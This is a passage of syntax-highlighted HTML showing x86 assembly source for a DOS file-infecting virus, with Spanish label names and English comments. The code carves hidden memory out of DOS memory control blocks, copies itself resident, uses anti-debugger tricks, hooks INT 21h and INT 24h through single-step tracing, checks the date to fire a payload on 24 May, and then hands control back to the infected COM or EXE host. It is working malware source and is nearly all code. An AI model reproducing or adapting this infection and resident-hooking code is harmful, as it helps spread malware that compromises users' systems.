        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">; Last UMB?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinInstalacion</span><span class="sc0">      </span><span class="sc1">; If not, end instalation</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Anti-debugger :)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@@PorMCBs1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; More an-</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">; ti-debugger!</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">               </span><span class="sc1">; The same</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; At the end, DI = 0003 ...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">Truco1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ... and BX = 000F</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LongVirusP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Steal memory</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LongVirusP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get segment of the hole</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">  </span><span class="sc1">; Create an UMB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Palabro</span><span class="sc0">
         </span><span class="sc1">;   MOV     WORD PTR ES:[DI-02], 0008h</span><span class="sc0">
         </span><span class="sc1">;   MOV     WORD PTR ES:[DI], LongVirusP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00004353h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Get segment where the virus will be</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; allocated</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc5">@@CopiaVirus</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; DS=CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">      </span><span class="sc1">; DI=0</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Save SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">   </span><span class="sc1">; CX=Size of clean virus</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">         </span><span class="sc1">; Fowards</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RepMovsb</span><span class="sc0">    </span><span class="sc1">; Copy virus</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Recover SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; DS=reserved segment</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">   </span><span class="sc1">; Get int 21h interrupt vector</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">   </span><span class="sc1">; Save it here</span><span class="sc0">
</span><span class="sc5">Truco3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; Put CS onto stack</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VuelvedeMem</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX=Return direction</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; Put it onto stack</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; Jump to the copy of the virus in</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">SaltoaMem</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; memory...</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">       </span><span class="sc1">; Anti-debugging</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">                </span><span class="sc1">; ...then jump...</span><span class="sc0">

</span><span class="sc5">SaltoaMem</span><span class="sc0">   </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">            </span><span class="sc1">; ...here!</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">InstalacionPoli</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Set this to 0</span><span class="sc0">
                        </span><span class="sc1">; to indicate that random seed must</span><span class="sc0">
                        </span><span class="sc1">; be actualized</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">         </span><span class="sc1">; Get DTA address</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DirecDTA</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc1">; Save it here</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DirecDTA</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TrazaPorINT30h</span><span class="sc0">      </span><span class="sc1">; Now, let's go trace int 21h</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">   </span><span class="sc5">@@Sigue001</span><span class="sc0">        </span><span class="sc1">; If int 21h could be traced, jump</span><span class="sc0">

</span><span class="sc1">;; Single-step tracing</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3501h</span><span class="sc0">     </span><span class="sc1">; Get int 01 vector</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ptr01</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">; Save it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ptr01</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get int 21h address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc1">; Put it on "Puntero3"</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; ES = 0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">            </span><span class="sc1">; Set int 1 to "NewInt01h"</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0004</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewInt01h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0006</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">              </span><span class="sc1">; Active Trap-Flag</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">        </span><span class="sc1">; Call DOS function (do-nothing)</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">              </span><span class="sc1">; Set off Trap-Flag</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ptr01</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Recover true int 1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ptr01</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0004</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0006</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
</span><span class="sc5">@@Sigue001</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">        </span><span class="sc1">; Put in ES:DI the address of our int 21h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewInt21h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load in DS:BX the</span><span class="sc0">
                             </span><span class="sc1">; traced address</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">         </span><span class="sc1">; Set new int 21h, changing values in</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">    </span><span class="sc1">; traced interrupt and not in TVI or</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc1">; patching bytes with a JMP</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
                 </span><span class="sc1">; Construct a 32 bit int 24h jump in "BytesInt24h"</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BytesInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BytesInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">ProgramaInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BytesInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
                 </span><span class="sc1">; Put 2 IRETs in this direction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ByteInt1Bh</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CFCFh</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">        </span><span class="sc1">; Get date</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">         </span><span class="sc1">; CS = DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0518h</span><span class="sc0">      </span><span class="sc1">; Is 24/05? (random date :)   )</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PayLoad</span><span class="sc0">        </span><span class="sc1">; If it is, jump to the payload</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Desinfeccion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Put a 2 here</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">               </span><span class="sc1">; Return to the virus in the host</span><span class="sc0">
</span><span class="sc5">VuelvedeMem</span><span class="sc0"> </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">
</span><span class="sc5">FinChequeo</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">    </span><span class="sc1">; When the virus is in memory and install-check</span><span class="sc0">
                 </span><span class="sc1">; routine is used, it returns here directly</span><span class="sc0">
</span><span class="sc5">@@FinInstalacion</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">  </span><span class="sc1">; Recovers ES and DS from stack</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">  </span><span class="sc1">; Is EXE?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@EsunEXE</span><span class="sc0">        </span><span class="sc1">; Then jump to EXE reinitialization</span><span class="sc0">
</span><span class="sc1">;;; Host is a COM</span><span class="sc0">
   </span><span class="sc5">@@EsunCOM</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">         </span><span class="sc1">; Put CS onto stack</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">      </span><span class="sc1">; DI = 100h</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">         </span><span class="sc1">; Put 100h onto stack</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Los3bytes</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; SI=Address of the three</span><span class="sc0">
                          </span><span class="sc1">; saved bytes</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">            </span><span class="sc1">; Fowards</span><span class="sc0">
        </span><span class="sc6">MOVSW</span><span class="sc0">              </span><span class="sc1">; Recover this 3 overwritten bytes</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Put original value of SI in a COM</span><span class="sc0">
</span><span class="sc1">;;; Now it recovers initial register values of execution</span><span class="sc0">
      </span><span class="sc5">@@Salll</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">      </span><span class="sc1">; DI=initial SP</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0004</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; AX=BX=0</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00FFh</span><span class="sc0">   </span><span class="sc1">; CX=00FF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; DX=Segment of PSP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">091Ch</span><span class="sc0">   </span><span class="sc1">; BP=091C</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">            </span><span class="sc1">; Executes host</span><span class="sc0">
</span><span class="sc1">;;; Host is an EXE</span><span class="sc0">
   </span><span class="sc5">@@EsunEXE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; AX=Initial segment of the EXE in memory</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">InicSS</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Calculate original</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">InicCS</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; CS and SS</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">              </span><span class="sc1">; Set specified-in-header</span><span class="sc0">
